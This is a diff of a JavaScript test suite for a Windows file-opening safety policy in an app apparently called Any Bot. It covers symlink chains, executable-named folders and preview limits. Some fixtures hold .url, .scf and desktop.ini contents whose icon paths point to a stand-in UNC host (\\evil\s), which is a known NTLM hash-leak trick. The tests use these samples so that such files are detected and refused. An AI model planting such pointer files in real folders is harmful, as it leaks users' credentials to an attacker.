@@ -29,17 +29,25 @@ const enoent = () => Object.assign(new Error("not found"), { code: "ENOENT" });
 
 // An fs that records every call. `files` maps path -> size, `dirs` lists
 // folders, `links` maps path -> readlink target, `real` maps path -> realpath,
-// and anything under a `hang` prefix never answers.
-function fakeFs({ files = {}, dirs = [], links = {}, real = {}, hang = [] } = {}) {
+// `contents` maps path -> file bytes (open/read), anything under a `hang`
+// prefix never answers, and one under a `lag` prefix answers after lagMs.
+function fakeFs({ files = {}, dirs = [], links = {}, real = {}, contents = {}, hang = [], lag = [], lagMs = 0 } = {}) {
   const calls = [];
-  const known = [...Object.keys(files), ...dirs, ...Object.keys(links)].map((p) => p.toLowerCase());
+  const known = [...Object.keys(files), ...dirs, ...Object.keys(links), ...Object.keys(contents)].map((p) => p.toLowerCase());
   const exists = (p) => known.some((k) => k === p.toLowerCase() || k.startsWith(`${p.toLowerCase()}\\`));
-  const hung = (p) => hang.some((prefix) => p.toUpperCase().startsWith(prefix.toUpperCase()));
+  const under = (list, p) => list.some((prefix) => p.toUpperCase().startsWith(prefix.toUpperCase()));
   const call = (name, p, answer) => {
     calls.push([name, p]);
-    if (hung(p)) return new Promise(() => {});
+    if (under(hang, p)) return new Promise(() => {});
+    if (under(lag, p)) return new Promise((resolve) => setTimeout(resolve, lagMs)).then(answer);
     return answer();
   };
+  const dirent = (name, full) => ({
+    name,
+    isSymbolicLink: () => Boolean(links[full]),
+    isDirectory: () => !links[full] && (dirs.includes(full) || known.some((k) => k.startsWith(`${full.toLowerCase()}\\`))),
+    isFile: () => !links[full] && (files[full] !== undefined || contents[full] !== undefined),
+  });
   return {
     calls,
     lstat: (p) =>
@@ -60,6 +68,22 @@ function fakeFs({ files = {}, dirs = [], links = {}, real = {}, hang = [] } = {}
         if (files[p] !== undefined) return { isFile: () => true, isDirectory: () => false, size: files[p] };
         if (dirs.includes(p)) return { isFile: () => false, isDirectory: () => true, size: 0 };
         throw enoent();
+      }),
+    readdir: (p) =>
+      call("readdir", p, async () => {
+        const prefix = `${p.toLowerCase()}\\`;
+        const all = [...Object.keys(files), ...dirs, ...Object.keys(links), ...Object.keys(contents)];
+        const names = new Set(all.filter((k) => k.toLowerCase().startsWith(prefix)).map((k) => k.slice(prefix.length).split("\\")[0]));
+        return [...names].map((name) => dirent(name, `${p}\\${name}`));
+      }),
+    open: (p) =>
+      call("open", p, async () => {
+        if (contents[p] === undefined) throw enoent();
+        const bytes = Buffer.from(contents[p]);
+        return {
+          read: async (buffer, offset, length, position) => ({ bytesRead: bytes.copy(buffer, offset, position, position + length) }),
+          close: async () => {},
+        };
       }),
   };
 }
@@ -165,11 +189,31 @@ test("each type gets its default click", () => {
   assert.deepEqual(click("shot.png"), ["open", "preview", "image"]);
   assert.deepEqual(click("photo.heic"), ["open", "open", null]);
   assert.deepEqual(click("clip.mp4"), ["open", "open", null]);
-  assert.deepEqual(click("deck.pptx"), ["open", "open", null]);
-  assert.deepEqual(click("page.html"), ["open", "open", "text"]);
+  assert.deepEqual(click("report.pdf"), ["open", "open", null]);
   assert.deepEqual(click("main.ts"), ["reveal", "preview", "text"]);
   assert.deepEqual(click("setup.exe"), ["reveal", "reveal", null]);
   assert.deepEqual(click("disk.iso"), ["reveal", "reveal", null]);
+  // Office files, HTML, and SVG fetch what they point at when opened, and
+  // Explorer's zip view draws the icons inside: none of them is opened.
+  assert.deepEqual(click("deck.pptx"), ["reveal", "reveal", null]);
+  assert.deepEqual(click("notes.docx"), ["reveal", "reveal", null]);
+  assert.deepEqual(click("sheet.xlsx"), ["reveal", "reveal", null]);
+  assert.deepEqual(click("page.html"), ["reveal", "preview", "text"]);
+  assert.deepEqual(click("icon.svg"), ["reveal", "preview", "image"]);
+  assert.deepEqual(click("bundle.zip"), ["reveal", "reveal", null]);
+});
+
+test("a folder named like a file gets that file's rules, so a swap can't open a program", () => {
+  const folder = (name) => policy(name, { folder: true });
+  for (const name of ["projects", ".git", "photos.png", "notes.pdf"]) assert.equal(folder(name).action, "open", name);
+  for (const name of ["setup.exe", "run.BAT", "v1.2", "site.github.io"]) {
+    const rule = folder(name);
+    assert.deepEqual([rule.tier, rule.open, rule.reveal, rule.action, rule.kind, rule.reason], ["reveal", false, true, "reveal", "folder", "folder-name"], name);
+  }
+  assert.deepEqual([folder("x.lnk").tier, folder("x.lnk").reveal, folder("x.lnk").action], ["copy", false, "menu"]);
+  const exe = { state: "folder", name: "setup.exe", ...folder("setup.exe") };
+  assert.match(actionProblem(exe, "open", "setup.exe").message, /^Any Bot doesn't open folders named like \.exe files\. Use Show in folder\.$/);
+  assert.equal(actionProblem(exe, "reveal", "setup.exe"), null);
 });
 
 test("inspect finds files and folders, and the first base that has the path wins", async (t) => {
@@ -219,6 +263,28 @@ test("a link to a network path is refused without following it", async () => {
   assert.ok(!fs.calls.some(([, p]) => p.startsWith("\\\\")), "never touched the share");
 });
 
+test("a chain of links is walked hop by hop, so a -> b -> share is refused before anything follows a", async () => {
+  const links = { "C:\\ws\\a": "C:\\ws\\b", "C:\\ws\\b": "\\\\evil\\share" };
+  for (const raw of ["C:\\ws\\a", "C:\\ws\\a\\x.txt"]) {
+    const fs = fakeFs({ files: { "C:\\ws\\c.txt": 1 }, links });
+    assert.deepEqual(await win(fs).inspect(raw), { state: "refused", reason: "link" }, raw);
+    assert.ok(!fs.calls.some(([name]) => name === "realpath" || name === "stat"), JSON.stringify(fs.calls));
+    // Only link-free paths were asked about: never the share, never through a.
+    assert.deepEqual(fs.calls.filter(([name]) => name === "lstat").map(([, p]) => p), ["C:\\ws", "C:\\ws\\a", "C:\\ws\\b"], raw);
+  }
+  const relative = fakeFs({ files: { "C:\\ws\\c.txt": 1 }, links });
+  assert.deepEqual(await win(relative).inspect("a\\x.txt", { bases: ["C:\\ws"] }), { state: "refused", reason: "link" });
+  // A chain of local links resolves to the file at its end.
+  const fs = fakeFs({ files: { "C:\\data\\x.txt": 3 }, links: { "C:\\ws\\a": "C:\\ws\\b", "C:\\ws\\b": "..\\data" } });
+  const ref = await win(fs).inspect("C:\\ws\\a\\x.txt");
+  assert.equal(ref.state, "file");
+  assert.equal(ref.path, "C:\\data\\x.txt");
+  assert.ok(fs.calls.some(([name, p]) => name === "realpath" && p === "C:\\data\\x.txt"), "realpath gets the walked path");
+  // A loop runs out of hops.
+  const loop = fakeFs({ links: { "C:\\ws\\a": "C:\\ws\\b", "C:\\ws\\b": "C:\\ws\\a" } });
+  assert.deepEqual(await win(loop).inspect("C:\\ws\\a\\x.txt"), { state: "refused", reason: "link" });
+});
+
 test("the real name's extension decides, so an 8.3 short name can't hide one", async () => {
   const long = "C:\\ws\\averyveryverylongname.settingcontent-ms";
   const fs = fakeFs({ files: { [long]: 10, "C:\\ws\\AVERYV~1.SET": 10 }, real: { "C:\\ws\\AVERYV~1.SET": long } });
@@ -245,6 +311,15 @@ test("a slow drive answers unknown and is skipped for a while", async () => {
   assert.equal((await inspector.inspect("C:\\ws\\a.md")).state, "file");
   clock += 60_001;
   assert.equal(inspector.isSlow("D:"), false);
+});
+
+test("a drive that answers late was only busy: its slow mark clears once the call returns", async () => {
+  const fs = fakeFs({ files: { "C:\\ws\\a.md": 1 }, lag: ["C:\\ws"], lagMs: 60 });
+  const inspector = win(fs, { slowMs: 20, coolMs: 60_000 });
+  assert.deepEqual(await inspector.inspect("C:\\ws\\a.md"), { state: "unknown" });
+  assert.equal(inspector.isSlow("C:"), true);
+  await new Promise((resolve) => setTimeout(resolve, 80));
+  assert.equal(inspector.isSlow("C:"), false);
 });
 
 test("files.check validates, caches the context, and answers unknown past the deadline", async () => {
@@ -279,11 +354,11 @@ test("files.check validates, caches the context, and answers unknown past the de
 
 test("actions explain in plain words why they can't run", () => {
   assert.deepEqual(actionProblem({ state: "missing" }, "open", "C:\\x\\report.md"), { message: "That file isn't there any more: report.md" });
-  assert.match(actionProblem({ state: "refused", reason: "network" }, "open", "x").message, /^Network locations aren't opened from chat\.$/);
+  assert.match(actionProblem({ state: "refused", reason: "network" }, "open", "x").message, /^Any Bot doesn't open network locations\.$/);
   assert.equal(actionProblem({ state: "refused", reason: "network" }, "preview", "x").record, true);
   const exe = { state: "file", name: "setup.exe", ...policy("setup.exe") };
   assert.deepEqual(actionProblem(exe, "open", "setup.exe"), {
-    message: "Any Bot doesn't open .exe files from chat because they can run programs. Use Show in folder.",
+    message: "Any Bot doesn't open .exe files because they can run programs. Use Show in folder.",
     record: true,
     reason: "runs-programs",
     ext: ".exe",
@@ -291,9 +366,66 @@ test("actions explain in plain words why they can't run", () => {
   assert.equal(actionProblem(exe, "reveal", "setup.exe"), null);
   assert.equal(actionProblem(exe, "preview", "setup.exe"), null);
   const lnk = { state: "file", name: "x.lnk", ...policy("x.lnk") };
-  assert.match(actionProblem(lnk, "reveal", "x.lnk").message, /Shortcut files aren't shown/);
+  assert.match(actionProblem(lnk, "reveal", "x.lnk").message, /^Any Bot doesn't show shortcut files in their folder\./);
+  const god = { state: "folder", name: "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}", ...policy("GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}", { folder: true }) };
+  assert.match(actionProblem(god, "open", "x").message, /^Any Bot doesn't open special system folders\./);
+  assert.match(actionProblem(god, "reveal", "x").message, /^Any Bot doesn't show special system folders in Explorer\./);
+  // The same links show in attachments and the Files panel, so no message says "from chat".
+  for (const [ref, action] of [[exe, "open"], [lnk, "open"], [lnk, "reveal"], [god, "open"], [{ state: "file", name: "a.xyz", ...policy("a.xyz") }, "open"]])
+    assert.doesNotMatch(actionProblem(ref, action, "x").message, /chat/);
   const md = { state: "file", name: "a.md", ...policy("a.md") };
   assert.equal(actionProblem(md, "open", "a.md"), null);
+});
+
+// Explorer draws a folder with the icons its pointer files name; one on
+// \\host sends the NTLM hash. Written as a fake fs so no real file points
+// anywhere.
+test("a folder is only opened, or a file shown in it, when no shortcut in it points to the network", async () => {
+  const unc = "[InternetShortcut]\r\nURL=https://example.com/\r\nIconFile=\\\\evil\\s\\i.ico\r\nIconIndex=0\r\n";
+  const localIni = Buffer.from("\ufeff[.ShellClassInfo]\r\nIconResource=%SystemRoot%\\system32\\imageres.dll,-3\r\n", "utf16le");
+  const remoteIni = Buffer.from("\ufeff[.ShellClassInfo]\r\nIconResource=\\\\evil\\s\\i.ico,0\r\n", "utf16le");
+  const folder = { state: "folder", path: "C:\\ws\\out" };
+  const file = { state: "file", path: "C:\\ws\\out\\tool.exe" };
+  const problem = (contents, ref = folder, action = "open", extra = {}) =>
+    win(fakeFs({ files: { "C:\\ws\\out\\tool.exe": 1 }, contents, ...extra })).explorerProblem(ref, action);
+
+  assert.equal(await problem({ "C:\\ws\\out\\zz.url": unc }), "pointer");
+  assert.equal(await problem({ "C:\\ws\\out\\zz.url": unc }, file, "reveal"), "pointer", "Show in folder draws the same folder");
+  assert.equal(await problem({ "C:\\ws\\out\\desktop.ini": remoteIni }), "pointer", "UTF-16 desktop.ini");
+  assert.equal(await problem({ "C:\\ws\\out\\sub\\desktop.ini": remoteIni }), "pointer", "a subfolder's desktop.ini");
+  assert.equal(await problem({ "C:\\ws\\out\\x.scf": "[Shell]\r\nIconFile=//evil/s/i.ico\r\n" }), "pointer");
+  assert.equal(await problem({ "C:\\ws\\out\\x.url": "[InternetShortcut]\r\nURL=file://evil/s/x\r\n" }), "pointer");
+  assert.equal(await problem({}, folder, "open", { links: { "C:\\ws\\out\\share": "\\\\evil\\s" } }), "pointer", "a link to a share");
+  // Ordinary shortcuts, desktop.ini, and web links are fine, and so is a
+  // pointer file in some other folder.
+  assert.equal(await problem({ "C:\\ws\\out\\desktop.ini": localIni, "C:\\ws\\out\\site.url": "[InternetShortcut]\r\nURL=https://example.com/a\r\n" }), null);
+  assert.equal(await problem({ "C:\\ws\\other\\zz.url": unc }), null);
+  assert.equal(await problem({ "C:\\ws\\out\\zz.url": unc }, file, "open"), null, "opening a file doesn't draw its folder");
+  const many = Object.fromEntries(Array.from({ length: 2001 }, (_, i) => [`C:\\ws\\out\\f${i}.txt`, "x"]));
+  assert.equal(await problem(many), "crowded");
+  // readdir calls a OneDrive folder a link, but it isn't one (readlink says
+  // EINVAL): it's checked as a folder. A real link that can't be read isn't shown.
+  const reparse = (isLink) => ({
+    readdir: async () => [{ name: "OneDrive", isSymbolicLink: () => true, isDirectory: () => false, isFile: () => false }],
+    readlink: async () => {
+      throw Object.assign(new Error("invalid"), { code: "EINVAL" });
+    },
+    lstat: async () => ({ isSymbolicLink: () => isLink, isDirectory: () => !isLink }),
+    open: async () => {
+      throw enoent();
+    },
+  });
+  assert.equal(await win(reparse(false)).explorerProblem(folder, "open"), null);
+  assert.equal(await win(reparse(true)).explorerProblem(folder, "open"), "pointer");
+
+  const links = createFileLinks({ inspector: win(fakeFs({ contents: { "C:\\ws\\out\\zz.url": unc } })), context: async () => ({ bases: [] }) });
+  assert.deepEqual(await links.explorerProblem(folder, "open"), {
+    message: "That folder has a shortcut or desktop.ini that points to a network location, so Any Bot won't show it. Right-click to copy the path.",
+    record: true,
+    reason: "pointer",
+    ext: "",
+  });
+  assert.equal(await links.explorerProblem(folder, "preview"), null);
 });
 
 test("previews read at most 512 KB of text and 2 MB of image", async (t) => {
@@ -320,6 +452,12 @@ test("previews read at most 512 KB of text and 2 MB of image", async (t) => {
   assert.equal((await preview("huge.png", Buffer.alloc(3 * 1024 * 1024))).kind, "file");
   assert.equal((await preview("clip.mp4", "not really")).kind, "file");
   assert.equal((await preview("setup.exe", "MZ")).kind, "file");
+  // A different file at the path than the one inspect() checked shows no content.
+  await writeFile(join(root, "swapped.md"), "secret");
+  const ref = await inspector.inspect(join(root, "swapped.md"));
+  assert.match(ref.identity, /^\d+:\d+$/);
+  assert.equal((await readPreview(ref)).kind, "text");
+  assert.equal((await readPreview({ ...ref, identity: "0:0" })).kind, "file");
 });
 
 test("owner paths for revealPath and listDirectory refuse device paths and hidden characters", () => {
